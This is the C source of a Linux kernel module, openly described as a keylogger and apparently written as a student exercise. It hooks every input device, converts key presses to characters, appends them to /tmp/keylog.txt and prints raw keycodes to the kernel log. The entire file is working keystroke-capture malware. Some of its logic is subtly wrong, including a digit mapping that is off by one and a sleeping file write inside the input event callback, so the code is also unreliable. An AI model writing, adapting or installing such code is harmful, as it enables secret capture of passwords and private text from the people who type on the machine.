#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/input.h>
#include <linux/fs.h>  
#include <linux/uaccess.h> 
#include <linux/slab.h> 

MODULE_LICENSE("GPL");
MODULE_AUTHOR("281443-279460");
MODULE_DESCRIPTION("Keylogger that writes keys as characters to a text file");
MODULE_VERSION("1.0");

static struct input_handler keylogger_handler;
static struct file *file = NULL;
static struct mutex keylog_mutex; 


static char keycode_to_char(unsigned int code) {
    if (code >= KEY_1 && code <= KEY_9) {
        return '0' + (code - KEY_1); 
    }
    if (code == KEY_0) {
        return '0';
    }
    if (code >= KEY_A && code <= KEY_Z) {
        return 'A' + (code - KEY_A); 
    }
    if (code == KEY_SPACE) {
        return ' ';  
    }
    if (code == KEY_ENTER) {
        return '\n';  
    }
    
    return '\0';  
}


static void log_key_to_file(char key) {
    char log_entry[64];
    int len;

    if (key == '\0')  
        return;


    len = snprintf(log_entry, sizeof(log_entry), "%c", key);

  
    mutex_lock(&keylog_mutex);

    if (file) {

        kernel_write(file, log_entry, len, &file->f_pos);  
    }

    mutex_unlock(&keylog_mutex);  
}


static void keylogger_event(struct input_handle *handle, unsigned int type, unsigned int code, int value) {
    if (type == EV_KEY && value == 1) { 
        printk(KERN_INFO "Key pressed: %u\n", code);
        char key = keycode_to_char(code);  
        log_key_to_file(key); 
    }
}


static int keylogger_connect(struct input_handler *handler, struct input_dev *dev, const struct input_device_id *id) {
    struct input_handle *handle;

    handle = kzalloc(sizeof(struct input_handle), GFP_KERNEL);
    if (!handle)
        return -ENOMEM;

    handle->dev = dev;
    handle->handler = handler;
    handle->name = "keylogger";

    input_register_handle(handle);
    input_open_device(handle);

    return 0;
}


static void keylogger_disconnect(struct input_handle *handle) {
    input_close_device(handle);
    input_unregister_handle(handle);
    kfree(handle);
}


static const struct input_device_id keylogger_ids[] = {
    { .driver_info = 1 },
    { },
};

MODULE_DEVICE_TABLE(input, keylogger_ids);


static struct input_handler keylogger_handler = {
    .event = keylogger_event,
    .connect = keylogger_connect,
    .disconnect = keylogger_disconnect,
    .name = "keylogger",
    .id_table = keylogger_ids,
};


static int __init keylogger_init(void) {
    mutex_init(&keylog_mutex);


    file = filp_open("/tmp/keylog.txt", O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (IS_ERR(file)) {
        printk(KERN_ERR "Failed to open /tmp/keylog.txt\n");
        return PTR_ERR(file);
    }


    return input_register_handler(&keylogger_handler);
}


static void __exit keylogger_exit(void) {

    if (file)
        filp_close(file, NULL);


    input_unregister_handler(&keylogger_handler);

    mutex_destroy(&keylog_mutex);
}

module_init(keylogger_init);
module_exit(keylogger_exit);
